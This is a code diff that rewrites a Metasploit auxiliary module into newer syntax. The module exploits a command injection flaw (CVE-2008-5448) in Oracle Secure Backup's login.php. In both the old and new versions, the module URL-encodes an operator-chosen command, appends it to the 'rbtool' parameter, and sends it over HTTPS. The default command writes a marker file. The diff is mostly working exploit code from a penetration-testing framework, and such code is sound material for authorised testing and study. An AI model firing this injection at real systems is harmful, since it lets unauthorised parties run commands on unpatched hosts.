@@ -1,61 +1,51 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
 
-require 'msf/core'
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Oracle Secure Backup exec_qr() Command Injection Vulnerability',
+      'Description'    => %q{
+          This module exploits a command injection vulnerability in Oracle Secure Backup version 10.1.0.3 to 10.2.0.2.
+      },
+      'Author'         => [ 'MC' ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2008-5448' ],
+          [ 'OSVDB', '51342' ],
+          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpujan2009.html' ],
+          [ 'ZDI', '09-003' ],
+        ],
+      'DisclosureDate' => 'Jan 14 2009'))
 
-class Metasploit3 < Msf::Auxiliary
+    register_options(
+      [
+        Opt::RPORT(443),
+        OptString.new('CMD', [ false, "The command to execute.", "cmd.exe /c echo metasploit > %SYSTEMDRIVE%\\metasploit.txt" ]),
+        OptBool.new('SSL',   [true, 'Use SSL', true]),
+      ])
+  end
 
-	include Msf::Exploit::Remote::HttpClient
+  def run
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'Oracle Secure Backup exec_qr() Command Injection Vulnerability',
-			'Description'    => %q{
-					This module exploits a command injection vulnerablility in Oracle Secure Backup version 10.1.0.3 to 10.2.0.2.
-			},
-			'Author'         => [ 'MC' ],
-			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision$',
-			'References'     =>
-				[
-					[ 'CVE', '2008-5448' ],
-					[ 'OSVDB', '51342' ],
-					[ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpujan2009.html' ],
-					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-09-003' ],
-				],
-			'DisclosureDate' => 'Jan 14 2009'))
+    r = Rex::Text.rand_text_english(2)
 
-		register_options(
-			[
-				Opt::RPORT(443),
-				OptString.new('CMD', [ false, "The command to execute.", "cmd.exe /c echo metasploit > %SYSTEMDRIVE%\\metasploit.txt" ]),
-				OptBool.new('SSL',   [true, 'Use SSL', true]),
-			], self.class)
-	end
+    cmd = datastore['CMD']
 
-	def run
+    uri = "/login.php?clear=no&ora_osb_lcookie=&ora_osb_bgcookie=#{r}&button=Logout&rbtool="
 
-		r = Rex::Text.rand_text_english(2)
+    req = uri + Rex::Text.uri_encode(cmd)
 
-		cmd = datastore['CMD']
+    print_status("Sending command: #{datastore['CMD']}...")
 
-		uri = "/login.php?clear=no&ora_osb_lcookie=&ora_osb_bgcookie=#{r}&button=Logout&rbtool="
+    res = send_request_raw({'uri' => req,},5)
 
-		req = uri + Rex::Text.uri_encode(cmd)
+    print_status("Done.")
 
-		print_status("Sending command: #{datastore['CMD']}...")
-
-		res = send_request_raw({'uri' => req,},5)
-
-		print_status("Done.")
-
-	end
+  end
 end
